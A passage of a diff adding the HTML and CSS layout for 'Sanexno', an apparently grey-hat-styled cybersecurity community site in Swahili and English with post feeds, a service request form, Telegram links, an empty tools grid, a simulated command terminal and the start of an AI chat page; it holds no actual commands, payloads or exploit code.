@@ -1,0 +1,1090 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sanexno — Cyber Intelligence Platform</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --c:#00f0ff;--cg:rgba(0,240,255,.35);--cd:#0a1628;
+  --g:#c0c0c0;--gg:rgba(192,192,192,.3);--gd:#1a1a2e;
+  --bg:#05080f;--pur:#7b2ff7;--red:#ff0040;--txt:#e0e0e0;
+  --glass:rgba(255,255,255,.04);--gb:rgba(255,255,255,.09);
+}
+body{font-family:'Rajdhani',sans-serif;background:var(--bg);color:var(--txt);overflow-x:hidden;min-height:100vh;}
+
+/* SCROLLBAR */
+::-webkit-scrollbar{width:5px;height:5px;}
+::-webkit-scrollbar-track{background:transparent;}
+::-webkit-scrollbar-thumb{background:var(--c);border-radius:10px;}
+
+/* LOADING */
+#ls{position:fixed;inset:0;background:var(--bg);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:99999;transition:opacity .8s,visibility .8s;}
+#ls.hidden{opacity:0;visibility:hidden;}
+.lring{position:absolute;inset:0;border-radius:50%;border:3px solid transparent;animation:spin 1.5s linear infinite;}
+.lring:nth-child(1){border-top-color:var(--c);}
+.lring:nth-child(2){border-top-color:var(--g);animation-duration:2s;animation-direction:reverse;inset:12.5%;width:75%;height:75%;}
+.lring:nth-child(3){border-top-color:var(--pur);animation-duration:1.2s;inset:25%;width:50%;height:50%;}
+.lc-wrap{position:relative;width:180px;height:180px;}
+.lc-mid{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-family:'Orbitron',monospace;font-size:13px;color:var(--c);text-align:center;animation:pulse 1.5s ease-in-out infinite;}
+.lc-mid span{display:block;font-size:9px;color:var(--g);letter-spacing:3px;margin-top:4px;}
+.scan-ln{position:absolute;width:100%;height:2px;background:linear-gradient(90deg,transparent,var(--c),transparent);animation:scan 2s ease-in-out infinite;top:0;}
+.ltxt{margin-top:25px;font-family:'Orbitron',monospace;font-size:11px;letter-spacing:5px;color:var(--g);opacity:.7;}
+.lbar{margin-top:12px;width:280px;height:3px;background:rgba(255,255,255,.1);border-radius:3px;overflow:hidden;}
+.lbar-fill{height:100%;width:0;background:linear-gradient(90deg,var(--c),var(--pur),var(--g));animation:fillbar 3.5s ease-in-out forwards;}
+@keyframes spin{to{transform:rotate(360deg);}}
+@keyframes pulse{0%,100%{opacity:1;}50%{opacity:.3;}}
+@keyframes scan{0%{top:0;opacity:0;}10%{opacity:1;}90%{opacity:1;}100%{top:100%;opacity:0;}}
+@keyframes fillbar{0%{width:0;}100%{width:100%;}}
+
+/* MATRIX CANVAS */
+#mx{position:fixed;inset:0;pointer-events:none;z-index:0;opacity:.04;}
+
+/* HEADER */
+.hdr{position:fixed;top:0;left:0;width:100%;padding:8px 28px;background:rgba(5,8,15,.96);backdrop-filter:blur(20px);border-bottom:1px solid var(--gb);display:flex;justify-content:space-between;align-items:center;z-index:1000;}
+.logo{font-family:'Orbitron',monospace;font-size:19px;font-weight:900;background:linear-gradient(135deg,var(--c),var(--pur),var(--g));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:2px;}
+.logo-sub{font-size:9px;letter-spacing:4px;color:var(--g);opacity:.5;display:block;-webkit-text-fill-color:var(--g);}
+.nav{display:flex;gap:4px;align-items:center;flex-wrap:wrap;}
+.nav a{color:var(--txt);text-decoration:none;font-size:13px;font-weight:500;padding:5px 11px;border-radius:6px;transition:.3s;cursor:pointer;}
+.nav a:hover,.nav a.active{color:var(--c);background:rgba(0,240,255,.07);}
+.nav .abtn{border:1px solid var(--c);color:var(--c)!important;border-radius:20px!important;}
+.nav .abtn:hover{background:var(--c)!important;color:var(--bg)!important;box-shadow:0 0 20px var(--cg);}
+
+/* HERO */
+.hero{height:100vh;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;padding-top:60px;}
+.hero::before{content:'';position:absolute;inset:0;background:radial-gradient(circle at 30% 50%,rgba(0,240,255,.06) 0%,transparent 50%),radial-gradient(circle at 70% 50%,rgba(192,192,192,.06) 0%,transparent 50%);pointer-events:none;}
+.hc{text-align:center;z-index:2;padding:0 20px;}
+.ht{font-family:'Orbitron',monospace;font-size:4rem;font-weight:900;letter-spacing:8px;margin-bottom:6px;background:linear-gradient(135deg,var(--c),#fff,var(--g));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:gpulse 3s ease-in-out infinite;}
+.hs{font-size:1.1rem;letter-spacing:10px;color:var(--g);opacity:.6;margin-bottom:8px;}
+.hd{color:var(--g);opacity:.5;margin-bottom:35px;letter-spacing:2px;font-size:13px;}
+.hbtn{padding:14px 45px;border:2px solid var(--c);background:transparent;color:var(--c);font-family:'Orbitron',monospace;font-size:13px;letter-spacing:4px;cursor:pointer;border-radius:50px;transition:.4s;text-decoration:none;display:inline-block;margin:5px;}
+.hbtn:hover{background:var(--c);color:var(--bg);box-shadow:0 0 50px var(--cg);transform:scale(1.05);}
+.hbtn-g{border-color:var(--g);color:var(--g);}
+.hbtn-g:hover{background:var(--g);color:var(--bg);box-shadow:0 0 50px var(--gg);}
+@keyframes gpulse{0%,100%{filter:brightness(1);}50%{filter:brightness(1.25);}}
+
+/* SECTIONS NAV (PAGES) */
+.page{display:none;min-height:100vh;padding-top:70px;}
+.page.active{display:block;}
+
+/* DUAL SECTION */
+.dual{display:flex;min-height:100vh;}
+.side{flex:1;padding:90px 35px 50px;position:relative;}
+.side-s{background:linear-gradient(135deg,#0a1628,#0d1f3c,#0a1628);border-right:1px solid rgba(0,240,255,.15);}
+.side-g{background:linear-gradient(135deg,#1a1a2e,#16213e,#1a1a2e);border-left:1px solid rgba(192,192,192,.15);}
+.sh{font-family:'Orbitron',monospace;font-size:2.2rem;font-weight:900;margin-bottom:6px;letter-spacing:5px;}
+.side-s .sh{color:var(--c);text-shadow:0 0 30px var(--cg);}
+.side-g .sh{color:var(--g);text-shadow:0 0 30px var(--gg);}
+.sd{font-size:12px;opacity:.5;margin-bottom:30px;letter-spacing:3px;}
+.scard{background:var(--glass);border:1px solid var(--gb);border-radius:14px;padding:22px;margin-bottom:22px;backdrop-filter:blur(10px);transition:.3s;}
+.scard:hover{border-color:rgba(0,240,255,.3);}
+.side-g .scard:hover{border-color:rgba(192,192,192,.3);}
+.ctitle{font-family:'Orbitron',monospace;font-size:13px;font-weight:700;margin-bottom:16px;display:flex;align-items:center;gap:8px;letter-spacing:2px;}
+.cicon{width:28px;height:28px;display:flex;align-items:center;justify-content:center;border-radius:7px;font-size:15px;}
+.side-s .cicon{background:rgba(0,240,255,.1);color:var(--c);}
+.side-g .cicon{background:rgba(192,192,192,.1);color:var(--g);}
+
+/* BUTTONS */
+.btn{padding:9px 22px;border:none;border-radius:8px;font-family:'Rajdhani',sans-serif;font-weight:600;font-size:13px;cursor:pointer;transition:.3s;letter-spacing:1px;}
+.btn-s{background:var(--c);color:var(--bg);}
+.btn-s:hover{box-shadow:0 0 25px var(--cg);transform:translateY(-2px);}
+.btn-g{background:var(--g);color:var(--bg);}
+.btn-g:hover{box-shadow:0 0 25px var(--gg);transform:translateY(-2px);}
+.btn-p{background:var(--pur);color:#fff;}
+.btn-p:hover{box-shadow:0 0 25px rgba(123,47,247,.4);transform:translateY(-2px);}
+.btn-r{background:var(--red);color:#fff;}
+.btn-r:hover{box-shadow:0 0 25px rgba(255,0,64,.4);transform:translateY(-2px);}
+.btn-out{background:transparent;border:1px solid var(--c);color:var(--c);}
+.btn-out:hover{background:var(--c);color:var(--bg);}
+
+/* FORMS */
+.fld{width:100%;background:rgba(255,255,255,.03);border:1px solid var(--gb);border-radius:9px;padding:11px 14px;color:var(--txt);font-family:'Rajdhani',sans-serif;font-size:14px;transition:.3s;margin-bottom:10px;}
+.fld:focus{outline:none;border-color:var(--c);box-shadow:0 0 15px rgba(0,240,255,.1);}
+textarea.fld{min-height:90px;resize:vertical;}
+select.fld option{background:var(--bg);}
+
+/* POSTS */
+.post-item{background:rgba(255,255,255,.02);border:1px solid var(--gb);border-radius:10px;padding:14px;margin-bottom:12px;transition:.3s;}
+.post-item:hover{border-color:rgba(0,240,255,.25);}
+.post-txt{font-size:14px;line-height:1.6;margin-bottom:8px;}
+.post-img{max-width:100%;max-height:280px;border-radius:8px;margin-top:8px;}
+.post-meta{font-size:11px;opacity:.45;display:flex;justify-content:space-between;margin-top:8px;}
+.post-comments{margin-top:10px;padding-top:10px;border-top:1px solid var(--gb);}
+.comment-item{font-size:12px;padding:4px 0;opacity:.8;}
+.comment-item strong{color:var(--c);}
+.side-g .comment-item strong{color:var(--g);}
+.cm-group{display:flex;gap:8px;margin-top:7px;}
+.cm-group input{flex:1;background:rgba(255,255,255,.03);border:1px solid var(--gb);border-radius:8px;padding:7px 11px;color:var(--txt);font-size:12px;}
+.cm-group input:focus{outline:none;border-color:var(--c);}
+
+/* TOOLS GRID */
+.tgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:10px;}
+.titem{background:rgba(255,255,255,.03);border:1px solid var(--gb);border-radius:10px;padding:14px;text-align:center;cursor:pointer;transition:.3s;position:relative;}
+.titem:hover{transform:translateY(-3px);}
+.side-s .titem:hover{border-color:var(--c);box-shadow:0 0 18px var(--cg);}
+.side-g .titem:hover{border-color:var(--g);box-shadow:0 0 18px var(--gg);}
+.ticon{font-size:28px;margin-bottom:6px;}
+.tname{font-size:11px;font-weight:600;letter-spacing:1px;}
+.tdesc{font-size:9px;opacity:.45;margin-top:3px;}
+.t-locked{opacity:.5;}
+.t-locked::after{content:'🔒';position:absolute;top:6px;right:6px;font-size:10px;}
+
+/* TOOL MODAL */
+.tmodal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);backdrop-filter:blur(12px);z-index:9000;align-items:center;justify-content:center;}
+.tmodal.active{display:flex;}
+.tmod-inner{background:linear-gradient(135deg,#0a1628,#1a1a2e);border:1px solid var(--gb);border-radius:18px;padding:30px;width:520px;max-width:95%;max-height:90vh;overflow-y:auto;position:relative;animation:min .3s ease;}
+.tmod-inner h3{font-family:'Orbitron',monospace;font-size:16px;color:var(--c);margin-bottom:8px;letter-spacing:2px;}
+.tmod-inner .tdesc-full{font-size:13px;opacity:.7;line-height:1.6;margin-bottom:15px;}
+.tmod-dl{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px;}
+.tmod-close{position:absolute;top:12px;right:15px;background:none;border:none;color:var(--txt);font-size:22px;cursor:pointer;opacity:.5;}
+.tmod-close:hover{opacity:1;}
+.tmod-img{width:100%;border-radius:10px;margin-bottom:12px;max-height:200px;object-fit:cover;background:rgba(0,240,255,.05);display:flex;align-items:center;justify-content:center;height:150px;}
+.tmod-img-placeholder{width:100%;height:150px;border-radius:10px;margin-bottom:12px;background:rgba(0,240,255,.05);border:1px dashed rgba(0,240,255,.2);display:flex;align-items:center;justify-content:center;font-size:40px;color:rgba(0,240,255,.3);}
+
+/* AI CHAT */
+#pg-ai{background:linear-gradient(135deg,#05080f,#0a1628,#1a1a2e);}
+.ai-wrap{max-width:820px;margin:0 auto;padding:20px;}
+.ai-title{font-family:'Orbitron',monospace;font-size:1.8rem;color:var(--c);text-align:center;margin-bottom:5px;letter-spacing:3px;}
+.ai-sub{text-align:center;opacity:.5;font-size:13px;margin-bottom:25px;letter-spacing:2px;}
+.chatbox{height:420px;overflow-y:auto;background:rgba(0,0,0,.3);border:1px solid var(--gb);border-radius:14px;padding:18px;margin-bottom:14px;display:flex;flex-direction:column;gap:10px;}
+.cmsg{max-width:78%;padding:11px 16px;border-radius:14px;font-size:13px;line-height:1.5;animation:msgin .3s ease;}
+.cmsg.user{align-self:flex-end;background:rgba(0,240,255,.13);border:1px solid rgba(0,240,255,.28);border-bottom-right-radius:4px;}
+.cmsg.ai{align-self:flex-start;background:rgba(192,192,192,.09);border:1px solid rgba(192,192,192,.18);border-bottom-left-radius:4px;}
+.mlbl{font-size:10px;font-weight:700;letter-spacing:1px;margin-bottom:4px;}
+.cmsg.user .mlbl{color:var(--c);}
+.cmsg.ai .mlbl{color:var(--g);}
+.thinking{display:flex;gap:5px;align-items:center;padding:10px 15px;}
+.thinking span{width:8px;height:8px;border-radius:50%;background:var(--g);animation:bounce 1.4s ease-in-out infinite;}
+.thinking span:nth-child(2){animation-delay:.2s;}
+.thinking span:nth-child(3){animation-delay:.4s;}
+@keyframes bounce{0%,60%,100%{transform:translateY(0);}30%{transform:translateY(-8px);}}
+.cin-group{display:flex;gap:10px;}
+.cin-group input{flex:1;padding:14px 18px;background:rgba(255,255,255,.03);border:1px solid var(--gb);border-radius:24px;color:var(--txt);font-family:'Rajdhani',sans-serif;font-size:14px;}
+.cin-group input:focus{outline:none;border-color:var(--c);}
+.cin-group button{width:48px;height:48px;border-radius:50%;border:none;background:var(--c);color:var(--bg);font-size:19px;cursor:pointer;transition:.3s;}
+.cin-group button:hover{box-shadow:0 0 25px var(--cg);}
+@keyframes msgin{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
+
+/* TERMINAL */
+#pg-term{background:#05080f;}
+.term-wrap{max-width:900px;margin:0 auto;padding:20px;}
+.term-title{font-family:'Orbitron',monospace;font-size:1.8rem;color:var(--c);margin-bottom:5px;letter-spacing:3px;}
+.term-sub{opacity:.5;font-size:13px;margin-bottom:20px;letter-spacing:2px;}
+.terminal{background:#000;border:1px solid rgba(0,240,255,.25);border-radius:12px;overflow:hidden;font-family:'Share Tech Mono',monospace;}
+.term-header{background:#0a1628;padding:10px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid rgba(0,240,255,.15);}
+.term-dot{width:12px;height:12px;border-radius:50%;}
+.term-screen{padding:18px;min-height:320px;max-height:420px;overflow-y:auto;font-size:13px;line-height:1.6;color:#00f0ff;}
+.term-line{margin-bottom:3px;word-break:break-all;}
+.term-line.out{color:#c0c0c0;}
+.term-line.err{color:#ff0040;}
+.term-line.ok{color:#00ff88;}
+.term-line.warn{color:#ffaa00;}
+.term-line.info{color:#7b2ff7;}
+.term-prompt{display:flex;align-items:center;gap:8px;margin-top:8px;padding:10px 18px;border-top:1px solid rgba(0,240,255,.1);}
+.term-prompt span{color:var(--c);white-space:nowrap;font-family:'Share Tech Mono',monospace;font-size:13px;}
+.term-prompt input{flex:1;background:none;border:none;outline:none;color:#c0c0c0;font-family:'Share Tech Mono',monospace;font-size:13px;caret-color:var(--c);}
+.cmd-cats{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:18px;}
+.cmd-cat{padding:6px 14px;border-radius:20px;font-size:12px;cursor:pointer;border:1px solid var(--gb);background:var(--glass);transition:.3s;letter-spacing:1px;}
+.cmd-cat:hover,.cmd-cat.active{border-color:var(--c);color:var(--c);background:rgba(0,240,255,.07);}
+.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:8px;margin-bottom:20px;}
+.cmd-btn{background:var(--glass);border:1px solid var(--gb);border-radius:8px;padding:8px 12px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--g);cursor:pointer;transition:.3s;text-align:left;}
+.cmd-btn:hover{border-color:var(--c);color:var(--c);background:rgba(0,240,255,.05);}
+.cmd-btn .cb-title{color:var(--c);display:block;font-size:12px;margin-bottom:2px;}
+.cmd-btn .cb-desc{font-size:10px;opacity:.5;font-family:'Rajdhani',sans-serif;}
+
+/* AUTH MODAL */
+.modal-ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.8);backdrop-filter:blur(10px);z-index:9999;align-items:center;justify-content:center;}
+.modal-ov.active{display:flex;}
+.modal{background:linear-gradient(135deg,#0a1628,#1a1a2e);border:1px solid var(--gb);border-radius:18px;padding:36px;width:400px;max-width:92%;position:relative;animation:min .3s ease;}
+@keyframes min{from{opacity:0;transform:scale(.92) translateY(15px);}to{opacity:1;transform:scale(1) translateY(0);}}
+.modal h2{font-family:'Orbitron',monospace;font-size:18px;margin-bottom:4px;letter-spacing:2px;background:linear-gradient(135deg,var(--c),var(--g));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+.modal p{font-size:12px;opacity:.55;margin-bottom:22px;}
+.modal-close{position:absolute;top:12px;right:15px;background:none;border:none;color:var(--txt);font-size:22px;cursor:pointer;opacity:.5;}
+.modal-close:hover{opacity:1;}
+.atoggle{text-align:center;margin-top:12px;font-size:12px;opacity:.65;}
+.atoggle a{color:var(--c);cursor:pointer;text-decoration:none;}
+
+/* FOOTER */
+footer{background:rgba(0,0,0,.5);border-top:1px solid var(--gb);padding:25px 35px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:15px;position:relative;z-index:2;}
+.fl{display:flex;gap:15px;align-items:center;flex-wrap:wrap;}
+.fl a{color:var(--txt);text-decoration:none;font-size:12px;opacity:.55;transition:.3s;display:flex;align-items:center;gap:4px;}
+.fl a:hover{opacity:1;color:var(--c);}
+.badge{padding:4px 10px;border-radius:16px;font-size:10px;font-weight:600;letter-spacing:1px;}
+.badge-s{background:rgba(0,240,255,.1);border:1px solid var(--c);color:var(--c)!important;opacity:1!important;}
+.badge-g{background:rgba(192,192,192,.1);border:1px solid var(--g);color:var(--g)!important;opacity:1!important;}
+.fcopy{font-size:11px;opacity:.35;font-family:'Orbitron',monospace;letter-spacing:2px;}
+
+/* GVENOX BANNER */
+.gvenox-banner{background:linear-gradient(135deg,rgba(123,47,247,.15),rgba(0,240,255,.1));border:1px solid rgba(123,47,247,.3);border-radius:14px;padding:22px;margin:20px 0;text-align:center;}
+.gvenox-banner h3{font-family:'Orbitron',monospace;font-size:16px;color:var(--pur);margin-bottom:6px;letter-spacing:3px;}
+.gvenox-banner p{font-size:13px;opacity:.65;margin-bottom:14px;}
+.gv-btns{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;}
+
+/* NOTIFICATION TOAST */
+.toast{position:fixed;bottom:25px;right:25px;background:linear-gradient(135deg,#0a1628,#1a1a2e);border:1px solid var(--c);border-radius:12px;padding:14px 20px;font-size:13px;z-index:99999;animation:toastin .4s ease;max-width:320px;}
+.toast.err{border-color:var(--red);}
+.toast.ok{border-color:#00ff88;}
+@keyframes toastin{from{opacity:0;transform:translateX(30px);}to{opacity:1;transform:translateX(0);}}
+
+/* STATS STRIP */
+.stats-strip{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:12px;margin-bottom:25px;}
+.stat-box{background:var(--glass);border:1px solid var(--gb);border-radius:12px;padding:16px;text-align:center;}
+.stat-num{font-family:'Orbitron',monospace;font-size:1.6rem;color:var(--c);font-weight:700;}
+.stat-lbl{font-size:11px;opacity:.5;letter-spacing:1px;margin-top:3px;}
+
+/* RESPONSIVE */
+@media(max-width:900px){.dual{flex-direction:column;}.side{padding:70px 18px 35px;}.side-s{border-right:none;border-bottom:1px solid rgba(0,240,255,.15);}.side-g{border-left:none;}.ht{font-size:2.5rem;letter-spacing:4px;}}
+@media(max-width:520px){.ht{font-size:1.8rem;}.hdr{padding:8px 12px;}.nav a{font-size:11px;padding:4px 7px;}.sh{font-size:1.6rem;}.dual{flex-direction:column;}footer{flex-direction:column;text-align:center;}.fl{justify-content:center;}}
+</style>
+</head>
+<body>
+
+<!-- LOADING -->
+<div id="ls">
+  <div class="lc-wrap">
+    <div class="scan-ln"></div>
+    <div class="lring"></div><div class="lring"></div><div class="lring"></div>
+    <div class="lc-mid">SANEXNO<span>LOADING...</span></div>
+  </div>
+  <div class="ltxt">INITIALIZING PROTOCOL</div>
+  <div class="lbar"><div class="lbar-fill"></div></div>
+</div>
+
+<canvas id="mx"></canvas>
+
+<div id="main-site" style="display:none;opacity:0;transition:opacity 1s;">
+
+<!-- HEADER -->
+<header class="hdr">
+  <div>
+    <div class="logo">SANEXNO</div>
+    <span class="logo-sub">CYBER INTELLIGENCE</span>
+  </div>
+  <nav class="nav" id="nav">
+    <a onclick="showPage('pg-home')" class="active">Home</a>
+    <a onclick="showPage('pg-sanex')">Sanex</a>
+    <a onclick="showPage('pg-grey')">Gvenox</a>
+    <a onclick="showPage('pg-tools')">Tools</a>
+    <a onclick="showPage('pg-term')">Terminal</a>
+    <a onclick="showPage('pg-ai')">AI Chat</a>
+    <a onclick="openAuth()" class="abtn" id="authBtn">Login</a>
+  </nav>
+</header>
+
+<!-- HOME PAGE -->
+<div id="pg-home" class="page active">
+  <section class="hero" id="home">
+    <div class="hc">
+      <div class="ht">SANEXNO</div>
+      <div class="hs">ANONYMOUS</div>
+      <p class="hd">Two Sides. One Mission. Absolute Security.</p>
+      <a class="hbtn" onclick="showPage('pg-sanex')">SANEX SIDE</a>
+      <a class="hbtn hbtn-g" onclick="showPage('pg-grey')">GVENOX SIDE</a>
+    </div>
+  </section>
+  <!-- STATS -->
+  <div style="padding:40px 40px 10px;position:relative;z-index:2;">
+    <div class="stats-strip">
+      <div class="stat-box"><div class="stat-num" id="stat-users">0</div><div class="stat-lbl">MEMBERS</div></div>
+      <div class="stat-box"><div class="stat-num" id="stat-tools">50+</div><div class="stat-lbl">TOOLS</div></div>
+      <div class="stat-box"><div class="stat-num">100+</div><div class="stat-lbl">COMMANDS</div></div>
+      <div class="stat-box"><div class="stat-num">24/7</div><div class="stat-lbl">AI ACTIVE</div></div>
+    </div>
+  </div>
+  <!-- GVENOX COLLAB BANNER -->
+  <div style="padding:0 40px 40px;position:relative;z-index:2;">
+    <div class="gvenox-banner">
+      <h3>[ GVENOX × SANEX ]</h3>
+      <p>Collaboration ya Gvenox na Sanex. Follow Gvenox channel upate tools za hali ya juu za cybersecurity.</p>
+      <div class="gv-btns">
+        <a href="https://t.me/gvenox" target="_blank" class="btn btn-p">📡 Follow Gvenox</a>
+        <a onclick="showPage('pg-grey')" class="btn btn-out">Ona Gvenox Side</a>
+      </div>
+    </div>
+  </div>
+  <footer>
+    <div class="fl">
+      <a href="https://t.me/sanexno" target="_blank" class="badge badge-s">📡 SANEX CHANNEL</a>
+      <a href="https://t.me/gvenox" target="_blank" class="badge badge-g">🔷 GVENOX CHANNEL</a>
+      <a href="#">Privacy</a><a href="#">Terms</a>
+    </div>
+    <div class="fcopy">© 2025 SANEXNO</div>
+  </footer>
+</div>
+
+<!-- SANEX PAGE -->
+<div id="pg-sanex" class="page">
+  <div class="dual">
+    <div class="side side-s">
+      <div class="sh">[ SANEX ]</div>
+      <div class="sd">CYBER SECURITY FRONT</div>
+      <!-- POST FORM -->
+      <div class="scard">
+        <div class="ctitle"><span class="cicon">📝</span> Create Post</div>
+        <textarea class="fld" id="sp-input" placeholder="Andika ujumbe wako..."></textarea>
+        <input type="file" id="sp-img" accept="image/*" style="color:var(--txt);font-size:12px;margin-bottom:10px;">
+        <button class="btn btn-s" onclick="createPost('sanex')">POST</button>
+      </div>
+      <div class="scard">
+        <div class="ctitle"><span class="cicon">📰</span> Sanex Feed</div>
+        <div id="sanex-posts"></div>
+      </div>
+      <!-- ORDER / SERVICE -->
+      <div class="scard">
+        <div class="ctitle"><span class="cicon">⚙️</span> Request Service</div>
+        <input class="fld" placeholder="Jina lako" id="ord-name">
+        <select class="fld" id="ord-svc">
+          <option value="">Chagua huduma...</option>
+          <option>Penetration Testing</option>
+          <option>Network Audit</option>
+          <option>Web Vulnerability Scan</option>
+          <option>Malware Analysis</option>
+          <option>Security Consultation</option>
+          <option>Custom Tool Development</option>
+        </select>
+        <textarea class="fld" placeholder="Maelezo zaidi..." id="ord-desc"></textarea>
+        <button class="btn btn-s" onclick="submitOrder()">SUBMIT REQUEST</button>
+      </div>
+    </div>
+  </div>
+  <footer>
+    <div class="fl">
+      <a href="https://t.me/sanexno" target="_blank" class="badge badge-s">📡 SANEX</a>
+      <a href="https://t.me/gvenox" target="_blank" class="badge badge-g">🔷 GVENOX</a>
+    </div>
+    <div class="fcopy">© 2025 SANEXNO</div>
+  </footer>
+</div>
+
+<!-- GVENOX/GREY PAGE -->
+<div id="pg-grey" class="page">
+  <div class="dual">
+    <div class="side side-g">
+      <div class="sh">[ GVENOX ]</div>
+      <div class="sd">GREY ANONYMOUS INTELLIGENCE</div>
+      <!-- GVENOX COLLAB -->
+      <div class="gvenox-banner" style="margin-bottom:20px;">
+        <h3>[ GVENOX CHANNEL ]</h3>
+        <p>Follow Gvenox kupata updates, tools, na habari za hali ya juu za cybersecurity ulimwenguni.</p>
+        <div class="gv-btns">
+          <a href="https://t.me/gvenox" target="_blank" class="btn btn-p">📡 Follow Gvenox Sasa</a>
+        </div>
+      </div>
+      <!-- POST FORM -->
+      <div class="scard">
+        <div class="ctitle"><span class="cicon" style="background:rgba(192,192,192,.1);color:var(--g);">📝</span> Grey Post</div>
+        <textarea class="fld" id="gp-input" placeholder="Andika ujumbe wako..."></textarea>
+        <input type="file" id="gp-img" accept="image/*" style="color:var(--txt);font-size:12px;margin-bottom:10px;">
+        <button class="btn btn-g" onclick="createPost('grey')">POST</button>
+      </div>
+      <div class="scard">
+        <div class="ctitle"><span class="cicon" style="background:rgba(192,192,192,.1);color:var(--g);">📰</span> Grey Feed</div>
+        <div id="grey-posts"></div>
+      </div>
+      <!-- TIPS -->
+      <div class="scard">
+        <div class="ctitle"><span class="cicon" style="background:rgba(192,192,192,.1);color:var(--g);">💡</span> Security Tips</div>
+        <input class="fld" id="tip-input" placeholder="Shiriki tip ya security...">
+        <button class="btn btn-g" onclick="addTip()">SHARE TIP</button>
+        <div id="tips-list" style="margin-top:12px;"></div>
+      </div>
+    </div>
+  </div>
+  <footer>
+    <div class="fl">
+      <a href="https://t.me/sanexno" target="_blank" class="badge badge-s">📡 SANEX</a>
+      <a href="https://t.me/gvenox" target="_blank" class="badge badge-g">🔷 GVENOX</a>
+    </div>
+    <div class="fcopy">© 2025 SANEXNO</div>
+  </footer>
+</div>
+
+<!-- TOOLS PAGE -->
+<div id="pg-tools" class="page">
+  <div style="padding:30px 35px;min-height:100vh;background:linear-gradient(135deg,#05080f,#0a1628);">
+    <div style="font-family:'Orbitron',monospace;font-size:1.8rem;color:var(--c);margin-bottom:5px;letter-spacing:3px;">[ TOOLS ]</div>
+    <div style="opacity:.5;font-size:13px;margin-bottom:20px;letter-spacing:2px;">SOFTWARE TOOLS — BONYEZA KUINGIA</div>
+    <div id="tools-grid" class="tgrid"></div>
+  </div>
+  <footer>
+    <div class="fl">
+      <a href="https://t.me/sanexno" target="_blank" class="badge badge-s">📡 SANEX</a>
+      <a href="https://t.me/gvenox" target="_blank" class="badge badge-g">🔷 GVENOX</a>
+    </div>
+    <div class="fcopy">© 2025 SANEXNO</div>
+  </footer>
+</div>
+
+<!-- TERMINAL PAGE -->
+<div id="pg-term" class="page">
+  <div class="term-wrap">
+    <div class="term-title">[ TERMINAL ]</div>
+    <div class="term-sub">CYBER COMMANDS — EDUCATIONAL PLATFORM</div>
+    <!-- CMD CATEGORIES -->
+    <div class="cmd-cats" id="cmd-cats">
+      <div class="cmd-cat active" onclick="filterCmds('all',this)">All</div>
+      <div class="cmd-cat" onclick="filterCmds('network',this)">Network</div>
+      <div class="cmd-cat" onclick="filterCmds('recon',this)">Recon</div>
+      <div class="cmd-cat" onclick="filterCmds('web',this)">Web</div>
+      <div class="cmd-cat" onclick="filterCmds('exploit',this)">Exploit</div>
+      <div class="cmd-cat" onclick="filterCmds('forensics',this)">Forensics</div>
+      <div class="cmd-cat" onclick="filterCmds('crypto',this)">Crypto</div>
+      <div class="cmd-cat" onclick="filterCmds('wireless',this)">Wireless</div>
+      <div class="cmd-cat" onclick="filterCmds('system',this)">System</div>
+      <div class="cmd-cat" onclick="filterCmds('osint',this)">OSINT</div>
+    </div>
+    <div class="cmd-grid" id="cmd-grid"></div>
+    <!-- TERMINAL -->
+    <div class="terminal">
+      <div class="term-header">
+        <div class="term-dot" style="background:#ff5f57;"></div>
+        <div class="term-dot" style="background:#febc2e;"></div>
+        <div class="term-dot" style="background:#28c840;"></div>
+        <span style="font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--g);margin-left:8px;opacity:.6;">sanexno@terminal:~$</span>
+      </div>
+      <div class="term-screen" id="term-screen">
+        <div class="term-line ok">╔════════════════════════════════════════╗</div>
+        <div class="term-line ok">║     SANEXNO CYBER TERMINAL v2.0        ║</div>
+        <div class="term-line ok">╚════════════════════════════════════════╝</div>
+        <div class="term-line warn">⚠ Kwa Elimu Tu — Educational Purpose Only</div>
+        <div class="term-line">Andika 'help' kuona commands zote.</div>
+        <div class="term-line out">Chagua command kutoka kwa buttons au andika mwenyewe.</div>
+      </div>
+      <div class="term-prompt">
+        <span>sanexno@terminal:~$</span>
+        <input type="text" id="term-input" placeholder="andika command..." autocomplete="off" onkeydown="termKey(event)">
+        <button class="btn btn-s" style="padding:7px 14px;font-size:12px;" onclick="termRun()">RUN</button>
+        <button class="btn" style="padding:7px 14px;font-size:12px;background:rgba(255,0,64,.2);border:1px solid var(--red);color:var(--red);" onclick="termClear()">CLR</button>
+      </div>
+    </div>
+  </div>
+  <footer style="margin-top:20px;">
+    <div class="fl">
+      <a href="https://t.me/sanexno" target="_blank" class="badge badge-s">📡 SANEX</a>
+      <a href="https://t.me/gvenox" target="_blank" class="badge badge-g">🔷 GVENOX</a>
+    </div>
+    <div class="fcopy">© 2025 SANEXNO</div>
+  </footer>
+</div>
+
+<!-- AI CHAT PAGE -->
+<div id="pg-ai" class="page">
+  <div class="ai-wrap">
+    <div class="ai-title">[ SANEX AI ]</div>
+    <div class="ai-sub">POWERED BY CLAUDE — CYBER INTELLIGENCE ASSISTANT</div>
+    <div class="chatbox" id="chatbox">
